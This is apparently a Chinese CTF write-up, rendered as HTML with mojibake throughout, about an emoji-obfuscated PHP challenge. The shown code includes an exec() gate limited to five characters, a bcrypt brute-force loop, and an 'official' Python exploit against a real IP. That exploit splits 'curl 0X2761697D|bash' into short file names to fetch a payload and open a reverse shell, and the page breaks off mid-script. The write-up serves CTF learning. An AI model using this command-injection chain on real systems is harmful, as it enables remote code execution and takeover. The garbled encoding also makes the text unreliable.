ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜œğŸ˜ƒğŸ˜ªğŸ˜¸ğŸ˜³ğŸ˜¹ğŸ˜‰ğŸ˜ƒğŸ˜´ğŸ˜ƒğŸ˜³ğŸ™†ğŸ˜±ğŸ˜˜ğŸ˜¢ğŸ™„ğŸ˜²ğŸ˜“ğŸ˜‰ğŸ™ŠğŸ˜©ğŸ˜§ğŸ˜…ğŸ˜»ğŸ˜©ğŸ˜½ğŸ˜‰ğŸ˜„ğŸ˜œğŸ™‡ğŸ˜ğŸ˜).ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜²ğŸ˜§ğŸ˜¡ğŸ˜)($_SERVER[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜¥ğŸ˜»ğŸ˜¦ğŸ˜ğŸ˜¤ğŸ˜ğŸ˜¢ğŸ˜–ğŸ˜¨ğŸ˜€ğŸ˜–ğŸ˜•ğŸ˜¢ğŸ˜–ğŸ˜™ğŸ˜)]);</span><br><span class="line">	ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜²ğŸ˜§ğŸ™„ğŸ˜»ğŸ˜±ğŸ˜¨ğŸ˜™ğŸ˜)($ğŸ˜³ğŸ˜‚ğŸ˜–ğŸ™…ğŸ˜ªğŸ˜—ğŸ˜š);</span><br><span class="line">	ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ˜»ğŸ˜±ğŸ˜¨ğŸ˜™ğŸ˜)($ğŸ˜³ğŸ˜‚ğŸ˜–ğŸ™…ğŸ˜ªğŸ˜—ğŸ˜š);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜©ğŸ˜‚ğŸ˜ğŸ˜»)]) &amp;&amp; ($ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…)($_GET[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜©ğŸ˜‚ğŸ˜ğŸ˜»)]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">		@ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜ªğŸ˜¨ğŸ˜¸ğŸ˜¼ğŸ˜©ğŸ™‡ğŸ˜ğŸ˜)($_GET[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜©ğŸ˜‚ğŸ˜ğŸ˜»)]);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜³ğŸ˜½ğŸ˜¦ğŸ™ŠğŸ˜ªğŸ˜¨ğŸ˜¡ğŸ˜)])) &#123;</span><br><span class="line">		@ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜ªğŸ˜¨ğŸ˜¸ğŸ˜¼ğŸ˜©ğŸ™‡ğŸ˜ğŸ˜)(ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜³ğŸ˜½ğŸ˜€ğŸ˜·ğŸ˜œğŸ˜¨ğŸ˜šğŸ˜½ğŸ˜™ğŸ˜‘ğŸ˜ğŸ˜) . $ğŸ˜³ğŸ˜‚ğŸ˜–ğŸ™…ğŸ˜ªğŸ˜—ğŸ˜š);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$ğŸ¯ = <span class="keyword">new</span> Bcrypt();</span><br><span class="line">$ğŸ”‘ = $_POST[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜³ğŸ˜—ğŸ˜–ğŸ™ŠğŸ˜³ğŸ˜ƒğŸ˜´ğŸ˜»)];</span><br><span class="line">$ğŸ”’ = ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜šğŸ˜”ğŸ˜šğŸ˜…ğŸ˜šğŸ˜”ğŸ˜•ğŸ™‡ğŸ˜šğŸ˜–ğŸ˜šğŸ˜“ğŸ˜ªğŸ˜½ğŸ˜»ğŸ˜„ğŸ˜¥ğŸ˜¨ğŸ˜’ğŸ˜›ğŸ˜£ğŸ˜¼ğŸ˜–ğŸ˜¢ğŸ˜²ğŸ˜¥ğŸ™€ğŸ˜•ğŸ˜ğŸ˜»ğŸ˜ªğŸ˜…ğŸ˜²ğŸ˜˜ğŸ˜¦ğŸ™‰ğŸ˜£ğŸ˜½ğŸ˜¦ğŸ™ˆğŸ˜²ğŸ˜¦ğŸ˜‘ğŸ™…ğŸ˜ğŸ˜½ğŸ˜ğŸ˜ğŸ˜²ğŸ˜ºğŸ˜´ğŸ˜€ğŸ˜ªğŸ˜—ğŸ˜‰ğŸ˜œğŸ˜©ğŸ˜ƒğŸ™€ğŸ˜ğŸ˜ğŸ˜¾ğŸ˜©ğŸ˜…ğŸ˜±ğŸ˜–ğŸ˜ğŸ˜ºğŸ˜ªğŸ˜”ğŸ˜¼ğŸ˜†ğŸ˜¢ğŸ˜—ğŸ˜¿ğŸ™ŠğŸ˜´ğŸ˜ğŸ˜¸ğŸ˜¼);</span><br><span class="line"><span class="keyword">if</span>($ğŸ¯-&gt;verify($ğŸ”‘, $ğŸ”’)) &#123;</span><br><span class="line">	<span class="keyword">echo</span>(ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜ ğŸ˜“ğŸ˜‰ğŸ˜¹ğŸ˜³ğŸ˜ºğŸ˜…ğŸ˜¡ğŸ˜©ğŸ˜¨ğŸ˜ğŸ™ŠğŸ˜´ğŸ˜‚ğŸ˜‰ğŸ™‰ğŸ˜ªğŸ˜“ğŸ˜’ğŸ˜‚ğŸ˜ªğŸ˜¨ğŸ˜šğŸ™€ğŸ˜ªğŸ˜½ğŸ˜¼ğŸ˜¼ğŸ˜ªğŸ˜“ğŸ˜•ğŸ˜ˆğŸ˜œğŸ˜‚ğŸ˜šğŸ™‰ğŸ˜ ğŸ˜·ğŸ˜ğŸ˜));</span><br><span class="line">	<span class="keyword">echo</span>(ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜¦ğŸ˜‚ğŸ˜‰ğŸ˜ƒğŸ˜™ğŸ˜£ğŸ˜–ğŸ˜ŸğŸ˜²ğŸ˜ƒğŸ˜³ğŸ™ƒğŸ˜±ğŸ˜—ğŸ˜–ğŸ˜ºğŸ˜±ğŸ™‰ğŸ˜’ğŸ™€ğŸ˜´ğŸ˜“ğŸ˜•ğŸ˜ˆğŸ˜œğŸ˜‚ğŸ˜šğŸ™‰ğŸ˜ ğŸ˜·ğŸ˜ğŸ˜));</span><br><span class="line">	ğŸ˜ğŸ˜();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span>(ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜ ğŸ˜“ğŸ˜‰ğŸ˜¹ğŸ˜³ğŸ˜ºğŸ˜…ğŸ˜¡ğŸ˜©ğŸ˜¨ğŸ˜ğŸ™ŠğŸ˜´ğŸ˜‚ğŸ˜‰ğŸ™‰ğŸ˜ªğŸ˜“ğŸ˜’ğŸ™…ğŸ˜²ğŸ˜ƒğŸ˜¡ğŸ˜·ğŸ˜²ğŸ˜§ğŸ˜–ğŸ˜€ğŸ˜©ğŸ˜‚ğŸ˜·ğŸ˜¸ğŸ˜ ğŸ˜“ğŸ˜‰ğŸ˜¹ğŸ˜³ğŸ˜ºğŸ˜„ğŸ˜));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆæ˜¯ä»£ç æ ¼å¼åŒ–ï¼Œæ¥ç€å°±æ˜¯<strong>ç†è§£ä»£ç çš„æ‰§è¡Œé€»è¾‘ï¼Œé¡ºä¾¿æ”¹å˜ä»£ç é€»è¾‘</strong></p>
<p>çœ‹é¢˜è§£ä¸Šçœ‹çš„æ˜¯ç¬¬ä¸€ä¸ªå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯æ··æ·†</p>
<p>ä¸ºä»€ä¹ˆè¦å…ˆçœ‹ç¬¬ä¸€ä¸ªå‡½æ•°</p>
<p><img src="/2020/09/28/%E5%A4%8D%E7%8E%B0wp/image-20200929221307190.png" alt="image-20200929221307190"></p>
<p>æ‰€ä»¥æˆ‘ä»¬å°±æƒ³ç›´æ¥çœ‹åœ¨ä¸åŒå‚æ•°ä¸‹ç¬¬ä¸€ä¸ªå‡½æ•°æ‰§è¡Œè¾“å‡ºçš„ç»“æœï¼Œæ‰€ä»¥åœ¨ç¬¬ä¸€ä¸ªå‡½æ•°ä¸­æ·»åŠ </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼<span class="params">($ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"åŠ å¯†åï¼š"</span>.$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰;</span><br><span class="line">	<span class="keyword">global</span> $ğŸ,$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…,$ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ™‰,$ğŸ,$ğŸ˜±ğŸ˜¨ğŸ˜ğŸ™ŠğŸ˜ªğŸ˜¨ğŸ˜¡ğŸ˜;</span><br><span class="line">	$ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…= (<span class="string">"$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…"</span>)($ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰)/<span class="number">4</span>;</span><br><span class="line">	$ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼ = <span class="string">""</span>;</span><br><span class="line">	<span class="keyword">for</span> ($ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€ = <span class="number">0</span>;$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€&lt;$ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…;$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€++) &#123;</span><br><span class="line">		$ğŸ˜©ğŸ˜‚ğŸ˜¦ğŸ™ƒ =$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*<span class="number">4</span>].$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*<span class="number">4</span>+<span class="number">1</span>].$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*<span class="number">4</span>+<span class="number">2</span>].$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*<span class="number">4</span>+<span class="number">3</span>];</span><br><span class="line">		$ğŸ˜ªğŸ˜¾ğŸ˜ğŸ˜€ =<span class="number">0</span>;</span><br><span class="line">		$ğŸ˜³ğŸ˜‚ğŸ˜¦ğŸ˜º =<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> ($ğŸ˜±ğŸ˜½ğŸ™€ğŸ™ =<span class="number">0</span>;$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™&lt;<span class="number">8</span>;$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™++) &#123;</span><br><span class="line">			<span class="keyword">for</span> ($ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚=<span class="number">0</span>;$ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚&lt;<span class="number">16</span>;$ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚++) &#123;</span><br><span class="line">				<span class="keyword">if</span>($ğŸ˜©ğŸ˜‚ğŸ˜¦ğŸ™ƒ == $ğŸ[$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™][$ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚]) &#123;</span><br><span class="line">					$ğŸ˜ªğŸ˜¾ğŸ˜ğŸ˜€=$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™;</span><br><span class="line">					$ğŸ˜³ğŸ˜‚ğŸ˜¦ğŸ˜º = $ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		$ğŸ˜²ğŸ˜¾ğŸ˜¦ğŸ™„ = $ğŸ˜ªğŸ˜¾ğŸ˜ğŸ˜€*<span class="number">16</span>+$ğŸ˜³ğŸ˜‚ğŸ˜¦ğŸ˜º;</span><br><span class="line">		$ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼ = $ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼.(<span class="string">"$ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ™‰"</span>)($ğŸ˜²ğŸ˜¾ğŸ˜¦ğŸ™„);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"åŸæ–‡ï¼š"</span>.(<span class="string">"$ğŸ"</span>)($ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼);</span><br><span class="line">	<span class="keyword">return</span> (<span class="string">"$ğŸ"</span>)($ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¹‹åä¾æ¬¡ä¿®æ”¹ä»£ç é€»è¾‘ï¼Œæ›¿æ¢å…¶ä¸­ç¬¬ä¸€ä¸ªå‡½æ•°è¾“å‡ºç»“æœ</p>
<p>æ ¸å¿ƒä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> ğŸ˜ğŸ˜<span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $ğŸ,$strlen,$chr,$base64_decode,$isset;</span><br><span class="line">	$path = <span class="string">"/var/www/html/sandbox/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">	mkdir($path);</span><br><span class="line">	chdir($path);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">		@exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">		<span class="comment">//</span></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">		@exec(<span class="string">"rm -rf"</span> . $path);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$ğŸ¯ = <span class="keyword">new</span> Bcrypt();</span><br><span class="line"></span><br><span class="line">$ğŸ”‘ = $_POST[<span class="string">"passwd"</span>];</span><br><span class="line">$ğŸ”’ = <span class="string">"$2y$10$RBfi8QpJJQQmJD6FylurJeqmP.6cMn7tdoKczL2v9hScd9zDj3wXe"</span>;</span><br><span class="line"><span class="keyword">if</span>($ğŸ¯-&gt;verify($passwd, $lock)) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Password verified!"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Wow!!Now,hack it!"</span>;</span><br><span class="line">	ğŸ˜ğŸ˜();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;Password not match!&lt;/br&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç„¶åå‘ç°æœ‰composeråŒ…ï¼Œå®‰è£…ï¼Œç„¶åæŸ¥èµ„æ–™bcrypt</p>
<h3 id="bcrypt"><a href="#bcrypt" class="headerlink" title="bcrypt"></a>bcrypt</h3><p><code>bcrypt</code>æ˜¯ä¸€ç§å“ˆå¸Œç®—æ³•ï¼Œå¯ä»¥é€šè¿‡ç¡¬ä»¶è¿›è¡Œæ‰©å±•ï¼ˆé€šè¿‡å¯é…ç½®çš„å¾ªç¯æ¬¡æ•°ï¼‰ã€‚</p>
<p><strong><code>bcrypt</code>æ˜¯ä¸€ç§å•å‘å“ˆå¸Œç®—æ³•ã€‚</strong>å¦‚æœä¸çŸ¥é“ç›ï¼Œåœ†<strong>å’Œå¯†ç </strong>ï¼ˆå¯†ç ï¼‰ï¼Œåˆ™æ— æ³•æ£€ç´¢çº¯æ–‡æœ¬å¯†ç ã€‚</p>
<blockquote>
<p>åŠ ç›ï¼š</p>
<p>å°±æ˜¯äººä¸ºçš„é€šè¿‡ä¸€ç»„éšæœºå­—ç¬¦ä¸ç”¨æˆ·åŸå¯†ç çš„ç»„åˆå½¢æˆä¸€ä¸ªæ–°çš„å­—ç¬¦ï¼Œä»è€Œå¢åŠ ç ´è¯‘çš„éš¾åº¦ã€‚</p>
</blockquote>
<p>åœ¨phpä¸­ï¼Œä¸»è¦æœ‰å†…ç½®çš„å‡½æ•°<code>password_hash</code>å’Œ<code>password_verify</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$a = password_hash(<span class="string">'password'</span>,PASSWORD_DEFAULT);</span><br><span class="line"><span class="keyword">echo</span> $a.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(password_verify(<span class="string">'password'</span>,$a))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"failed"</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(password_get_info($a));</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¾“å‡ºä¿¡æ¯</span></span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">3</span>)</span><br><span class="line">  <span class="string">'algo'</span> =&gt; int <span class="number">1</span></span><br><span class="line">  <span class="string">'algoName'</span> =&gt; string <span class="string">'bcrypt'</span> (length=<span class="number">6</span>)</span><br><span class="line">  <span class="string">'options'</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (size=<span class="number">1</span>)</span><br><span class="line">      <span class="string">'cost'</span> =&gt; int <span class="number">10</span></span><br><span class="line">$a = password_hash(<span class="string">'password'</span>,PASSWORD_DEFAULT,<span class="keyword">array</span>(<span class="string">'cost'</span> =&gt; <span class="number">11</span>));</span><br><span class="line"><span class="comment">//ç›¸åº”çš„costä¹Ÿä¼šå˜ä¸º11ï¼›</span></span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥å°±æ˜¯çˆ†ç ´ï¼Œå·²çŸ¥å¯†ç ä¸ºbcrypt+4ä½å°å†™å­—æ¯</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>; </span><br><span class="line"><span class="keyword">use</span> <span class="title">Bcrypt</span>\<span class="title">Bcrypt</span>; </span><br><span class="line">$key = <span class="string">"abcdefghijklmnopqrstuvwxyz"</span>; </span><br><span class="line">$bcrypt = <span class="keyword">new</span> Bcrypt(); </span><br><span class="line">$plaintext = <span class="string">'bcrypt'</span>;<span class="comment">//bcryptyyds </span></span><br><span class="line">$ciphertext = <span class="string">'$2y$10$RBfi8QpJJQQmJD6FylurJeqmP.6cMn7tdoKczL2v9hScd9zDj3wXe'</span>; </span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">26</span>;$i++) &#123; </span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;<span class="number">26</span>;$j++) &#123; </span><br><span class="line">        <span class="keyword">for</span>($k=<span class="number">0</span>;$k&lt;<span class="number">26</span>;$k++) &#123; </span><br><span class="line">            <span class="keyword">for</span>($m=<span class="number">0</span>;$m&lt;<span class="number">26</span>;$m++) &#123; </span><br><span class="line">                <span class="keyword">echo</span> $plaintext.$str.PHP_EOL; </span><br><span class="line">                $str = $key[$i].$key[$j].$key[$k].$key[$m]; </span><br><span class="line">                <span class="keyword">if</span>($bcrypt-&gt;verify($plaintext.$str, $ciphertext))&#123; </span><br><span class="line">                    <span class="keyword">echo</span>(<span class="string">"&lt;/br&gt;Password verified!&lt;/br&gt;"</span>); </span><br><span class="line">                    <span class="keyword">echo</span>(<span class="string">"Wow!!Now,hack it!&lt;/br&gt;"</span>); </span><br><span class="line">                &#125; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h3><p>æœ€ç»ˆçš„è€ƒç‚¹å°±æ˜¯å‘½ä»¤æ‰§è¡Œå¯ä»¥å‚è€ƒhitcon-ctf-2017</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> ğŸ˜ğŸ˜<span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $ğŸ,$strlen,$chr,$base64_decode,$isset;</span><br><span class="line">	$path = <span class="string">"/var/www/html/sandbox/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">	mkdir($path);</span><br><span class="line">	chdir($path);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">		@exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">		<span class="comment">//</span></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">		@exec(<span class="string">"rm -rf"</span> . $path);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é“é¢˜å¤§æ¦‚æ„æ€å°±æ˜¯å­˜åœ¨å‘½ä»¤æ‰§è¡Œï¼Œä½†å•æ¬¡è¾“å…¥å­—ç¬¦ä¸å¾—å¤§äº5ã€‚å› æ­¤åˆ©ç”¨linuxä¸‹ç‰¹æœ‰çš„å‘½ä»¤æ¥å†™å…¥shellåå¼¹ã€‚åŸç†å°±æ˜¯åˆ©ç”¨curl ip|bashç­‰å¾ˆå¤šæ–¹å¼å»åå¼¹shellã€‚é¡ºä¾¿ä¹Ÿå¤ä¹ äº†åå¼¹shellçš„ä¸€äº›åŸºæœ¬æ“ä½œ</p>
<p>å®˜æ–¹çš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">url = <span class="string">"http://219.219.61.234:10048/?cmd="</span></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate "g&gt; ht- sl" to file "v"</span></span><br><span class="line">    <span class="string">'&gt;dir'</span>,</span><br><span class="line">    <span class="string">'&gt;sl'</span>,</span><br><span class="line">    <span class="string">'&gt;g\&gt;'</span>,</span><br><span class="line">    <span class="string">'&gt;ht-'</span>,</span><br><span class="line">    <span class="string">'*&gt;v'</span>,</span><br><span class="line">    <span class="comment"># reverse file "v" to file "x", content "ls -th &gt;g" '</span></span><br><span class="line">    <span class="string">'&gt;rev'</span>,</span><br><span class="line">    <span class="string">'*v&gt;x'</span>,</span><br><span class="line">    <span class="comment"># generate "curl 0X2761697D|bash"</span></span><br><span class="line">    <span class="string">'&gt;sh '</span>,</span><br><span class="line">    <span class="string">'&gt;ba\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\|\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\\'</span>,</span><br><span class="line">    <span class="string">'&gt;7D\\'</span>,</span><br><span class="line">    <span class="string">'&gt;69\\'</span>,</span><br><span class="line">    <span class="string">'&gt;61\\'</span>,</span><br><span class="line">    <span class="string">'&gt;27\\'</span>,</span><br><span class="line">    <span class="string">'&gt;0X\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\ \\'</span>,</span><br><span class="line">    <span class="string">'&gt;rl\\'</span>,</span><br><span class="line">    <span class="string">'&gt;cu\\'</span>,</span><br><span class="line">    <span class="comment"># got shell</span></span><br><span class="line">    <span class="string">'sh x'</span>,</span><br><span class="line">    <span class="string">'sh g'</span>,</span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> i 